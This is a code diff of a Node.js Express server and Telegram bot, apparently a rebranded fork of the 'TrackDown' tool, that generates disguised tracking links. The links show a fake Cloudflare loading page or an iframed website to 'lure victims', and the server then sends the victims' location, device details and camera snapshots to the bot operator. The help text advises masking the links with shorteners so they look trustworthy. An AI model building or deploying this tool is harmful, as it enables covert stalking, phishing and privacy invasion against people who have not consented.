@@ -1,250 +1,286 @@
 require('dotenv').config();
 const fs = require("fs");
 const express = require("express");
-var cors = require('cors');
-var bodyParser = require('body-parser');
+const cors = require('cors');
+const bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot(process.env["bot"], {polling: true});
-var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
-var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+
+const bot = new TelegramBot(process.env["bot"], { polling: true });
+
+const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
+const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });
 const app = express();
+
 app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-//Modify your URL here
-var hostURL="https://twh-track.onrender.com";
-//TOGGLE for Shorters
-var use1pt=false;
+// Serve static files (if needed)
+app.use(express.static("public"));
 
+// Channel Username
+const channelUsername = "@technicalwhitehat";
 
+// Base Host URL (Modify if needed)
+const hostURL = "https://twh-track.onrender.com";
 
-app.get("/w/:path/:uri",(req,res)=>{
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
-if(req.params.path != null){
-res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
-} 
-else{
-res.redirect("https://t.me/th30neand0nly0ne");
-}
+// Toggle for Shortener
+const use1pt = false;
 
-         
-                              
+// 📌 Start Command - Ask to Join Channel
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+
+    const options = {
+        reply_markup: JSON.stringify({
+            inline_keyboard: [
+                [{ text: "✅ Check Now", callback_data: "check_join" }],
+                [{ text: "📢 Join Now", url: "https://t.me/technicalwhitehat" }]
+            ]
+        })
+    };
+
+    bot.sendMessage(chatId, `
+👋 Welcome ${msg.chat.first_name}!
+🚀 To use this bot for FREE, you must join our Telegram Channel first.
+
+📢 Join now to unlock amazing features!
+👇 Click below to join and verify:
+  `, options);
 });
 
-app.get("/c/:path/:uri",(req,res)=>{
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+// 📌 Check Join Status
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
 
+    if (query.data === 'check_join') {
+        try {
+            const member = await bot.getChatMember(channelUsername, query.from.id);
 
-if(req.params.path != null){
-res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
-} 
-else{
-res.redirect("https://t.me/th30neand0nly0ne");
-}
+            // ✅ If user is a member, show the tracking features
+            if (member.status === 'member' || member.status === 'administrator' || member.status === 'creator') {
+                const welcomeOptions = {
+                    reply_markup: JSON.stringify({
+                        inline_keyboard: [
+                            [{ text: "🚀 Create Link", callback_data: "crenew" }], // Create Link Button
+                            [{ text: "⭕ YouTube ⭕", url: "https://bit.ly/3RzjdHX" }], // Updated YouTube Button
+                            [{ text: "💬 Telegram Group 💬", url: "https://bit.ly/3skACfa" }], // Updated Telegram Group Button
+                            [{ text: "🆘 Help", callback_data: "help_menu" }] // New Help Button
+                        ]
+                    })
+                };
 
-         
-                              
+                bot.sendMessage(chatId, `
+👋 Welcome ${query.from.first_name}!
+
+🚀 Introducing the Ultimate Location Tracking Bot!
+
+With this bot, you can:
+✅ Track anyone’s location in real-time.  
+✅ Collect device details and camera snaps.  
+✅ Generate powerful tracking links instantly.  
+
+📣 Click on the buttons below to get started!
+                `, welcomeOptions);
+
+            } else {
+                // ❌ If user hasn't joined, ask to join again
+                bot.sendMessage(chatId, `
+❌ You haven't joined our channel yet!
+📢 Please join the channel to unlock the bot.
+
+👉 Click here to join: [Technical White Hat](https://t.me/technicalwhitehat)
+                `);
+            }
+        } catch (error) {
+            console.error("Error checking membership:", error);
+            bot.sendMessage(chatId, "❌ Something went wrong! Please try again.");
+        }
+    }
 });
 
+// 📌 Help Menu
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
 
+    if (query.data === 'help_menu') {
+        bot.sendMessage(chatId, `
+🔍 *Welcome to Technical White Hat's Tracking Bot!* 🔍
 
+🚀 *Unlock the Power of Tracking:*
+With this bot, you can create powerful tracking links to gather real-time location and device details. Here's how to get started:
+
+✨ *Commands:*
+✅ /create - Generate a tracking link in seconds.
+✅ /help - Learn more about the bot's features.
+
+🌐 *Key Features:*
+1. *Cloudflare Link* - Disguises as a loading page to collect data.
+2. *Webview Link* - Embeds a webpage for seamless tracking.
+
+💡 *Pro Tips for Better Tracking:*
+- Use URL shorteners like **bit.ly** or **tinyurl** to make your links look clean and trustworthy.
+- Mask your tracking links using services like **rebrandly** or **hyperlink.rest** to hide the original URL.
+- Always test your links before sharing to ensure they work as expected.
+
+📢 *Stay Updated:*
+Join our Telegram channel for tips, tricks, and updates:
+👉 [Technical White Hat](https://t.me/technicalwhitehat)
+
+🔥 *Ready to create your first link?* Click /create now!
+        `, { parse_mode: 'Markdown' });
+    }
+});
+
+// 📌 Main Tracking Features
 bot.on('message', async (msg) => {
-const chatId = msg.chat.id;
+    const chatId = msg.chat.id;
 
- 
+    if (msg?.reply_to_message?.text === "🚀 Awesome! Let's create your tracking link.\n🔗 Just drop the URL below, and I'll do the magic!") {
+        createLink(chatId, msg.text);
+    }
 
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
- createLink(chatId,msg.text); 
-}
-  
-if(msg.text=="/start"){
-var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
-};
+    if (msg.text == "/create") {
+        createNew(chatId);
+    } else if (msg.text == "/help") {
+        bot.sendMessage(chatId, `
+🔍 *Welcome to Technical White Hat's Tracking Bot!* 🔍
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
-}
-else if(msg.text=="/create"){
-createNew(chatId);
-}
-else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`);
-}
-  
-  
+🚀 *Unlock the Power of Tracking:*
+With this bot, you can create powerful tracking links to gather real-time location and device details. Here's how to get started:
+
+✨ *Commands:*
+✅ /create - Generate a tracking link in seconds.
+✅ /help - Learn more about the bot's features.
+
+🌐 *Key Features:*
+1. *Cloudflare Link* - Disguises as a loading page to collect data.
+2. *Webview Link* - Embeds a webpage for seamless tracking.
+
+💡 *Pro Tips for Better Tracking:*
+- Use URL shorteners like **bit.ly** or **tinyurl** to make your links look clean and trustworthy.
+- Mask your tracking links using services like **rebrandly** or **hyperlink.rest** to hide the original URL.
+- Always test your links before sharing to ensure they work as expected.
+
+📢 *Stay Updated:*
+Join our Telegram channel for tips, tricks, and updates:
+👉 [Technical White Hat](https://t.me/technicalwhitehat)
+
+🔥 *Ready to create your first link?* Click /create now!
+        `, { parse_mode: 'Markdown' });
+    }
 });
 
-bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
-bot.answerCallbackQuery(callbackQuery.id);
-if(callbackQuery.data=="crenew"){
-createNew(callbackQuery.message.chat.id);
-} 
-});
-bot.on('polling_error', (error) => {
-//console.log(error.code); 
+bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
+    bot.answerCallbackQuery(callbackQuery.id);
+    if (callbackQuery.data == "crenew") {
+        createNew(callbackQuery.message.chat.id);
+    }
 });
 
+// 📌 Create Tracking Link
+async function createLink(cid, msg) {
+    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
+    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
+        var url = cid.toString(36) + '/' + btoa(msg);
+        var m = {
+            reply_markup: JSON.stringify({
+                "inline_keyboard": [[{ text: "🚀 Create new Link", callback_data: "crenew" }]]
+            })
+        };
 
+        var cUrl = `${hostURL}/c/${url}`;
+        var wUrl = `${hostURL}/w/${url}`;
 
+        bot.sendChatAction(cid, "typing");
+        bot.sendMessage(cid, `
+✅ Your links have been created successfully:
 
+🌐 Cloudflare Link:
+${cUrl}
 
-async function createLink(cid,msg){
-
-var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
-
-if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
- 
-var url=cid.toString(36)+'/'+btoa(msg);
-var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
-};
-
-var cUrl=`${hostURL}/c/${url}`;
-var wUrl=`${hostURL}/w/${url}`;
-  
-bot.sendChatAction(cid,"typing");
-if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
-var f="",g="";
-
-for(var c in x){
-f+=x[c]+"\n";
+🌐 WebView Link:
+${wUrl}
+        `, m);
+    } else {
+        bot.sendMessage(cid, `🤔 Oops! Something's not right.\n🔗 Make sure to enter a valid URL (including http or https), and let's try again!`);
+        createNew(cid);
+    }
 }
 
-for(var c in y){
-g+=y[c]+"\n";
-}
-  
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
-}
-else{
-
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
-}
-}
-else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
-createNew(cid);
-
-}  
+// 📌 Ask for URL Input
+function createNew(cid) {
+    const options = {
+        reply_markup: JSON.stringify({ "force_reply": true })
+    };
+    bot.sendMessage(cid, `🚀 Awesome! Let's create your tracking link.\n🔗 Just drop the URL below, and I'll do the magic!`, options);
 }
 
+// 📌 Handle Location Data
+app.post("/location", (req, res) => {
+    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
+    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
+    const uid = decodeURIComponent(req.body.uid) || null;
+    const acc = decodeURIComponent(req.body.acc) || null;
 
-function createNew(cid){
-var mk={
-reply_markup:JSON.stringify({"force_reply":true})
-};
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
-}
-
-
-
-
-
-app.get("/", (req, res) => {
-var ip;
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-res.json({"ip":ip});
-
-  
+    if (lon && lat && uid && acc) {
+        const userId = parseInt(uid, 36);
+        bot.sendLocation(userId, lat, lon);
+        bot.sendMessage(userId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+        res.send("Done");
+    }
 });
 
+// 📌 Handle Camera Snapshots
+app.post("/camsnap", (req, res) => {
+    const uid = decodeURIComponent(req.body.uid) || null;
+    const img = decodeURIComponent(req.body.img) || null;
 
-app.post("/location",(req,res)=>{
+    if (uid && img) {
+        const buffer = Buffer.from(img, 'base64');
+        const info = { filename: "camsnap.png", contentType: 'image/png' };
 
-  
-var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
-var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
-var uid=decodeURIComponent(req.body.uid) || null;
-var acc=decodeURIComponent(req.body.acc) || null;
-if(lon != null && lat != null && uid != null && acc != null){
+        try {
+            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+        } catch (error) {
+            console.error("Error sending photo:", error);
+        }
 
-bot.sendLocation(parseInt(uid,36),lat,lon);
-
-bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
-  
-res.send("Done");
-}
+        res.send("Done");
+    }
 });
 
+// 📌 Add Missing Routes for Webview and Cloudflare
+app.get("/c/:path/:uri", (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
+    const d = new Date().toJSON().slice(0, 19).replace('T', ':');
+    const url = atob(req.params.uri);
+    const uid = req.params.path;
 
-app.post("/",(req,res)=>{
-
-var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null;
-
-var ip;
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
-if( uid != null && data != null){
-
- 
-if(data.indexOf(ip) < 0){
-return res.send("ok");
-}
-
-data=data.replaceAll("<br>","\n");
-
-bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
-
-  
-res.send("Done");
-}
+    if (uid && url) {
+        res.render("cloudflare", { ip: ip, time: d, url: url, uid: uid, a: hostURL, t: use1pt });
+    } else {
+        res.redirect("https://t.me/technicalwhitehat");
+    }
 });
 
+app.get("/w/:path/:uri", (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
+    const d = new Date().toJSON().slice(0, 19).replace('T', ':');
+    const url = atob(req.params.uri);
+    const uid = req.params.path;
 
-app.post("/camsnap",(req,res)=>{
-var uid=decodeURIComponent(req.body.uid)  || null;
-var img=decodeURIComponent(req.body.img) || null;
-  
-if( uid != null && img != null){
-  
-var buffer=Buffer.from(img,'base64');
-  
-var info={
-filename:"camsnap.png",
-contentType: 'image/png'
-};
-
-
-try {
-bot.sendPhoto(parseInt(uid,36),buffer,{},info);
-} catch (error) {
-console.log(error);
-}
-
-
-res.send("Done");
- 
-}
-
+    if (uid && url) {
+        res.render("webview", { ip: ip, time: d, url: url, uid: uid, a: hostURL, t: use1pt });
+    } else {
+        res.redirect("https://t.me/technicalwhitehat");
+    }
 });
 
-
-
+// 📌 Start the Express Server
 app.listen(5000, () => {
-console.log("App Running on Port 5000!");
+    console.log("🚀 Bot is running on port 5000!");
 });
